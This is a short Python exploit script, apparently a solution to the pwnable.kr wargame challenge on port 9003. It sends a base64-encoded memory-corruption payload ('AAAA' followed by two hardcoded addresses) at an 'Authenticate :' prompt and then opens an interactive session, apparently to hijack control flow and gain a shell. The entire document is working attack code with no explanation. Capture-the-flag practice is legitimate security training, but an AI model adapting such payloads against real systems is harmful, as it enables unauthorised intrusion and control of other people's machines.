from zio import *
from base64 import *
from random import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = ('pwnable.kr', 9003)
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)

payload =   'AAAA'
payload +=  l32(0x08049284)
payload +=  l32(0x0811eb40)  

io.read_until('Authenticate :')
io.writeline(b64encode(payload))
io.interact()
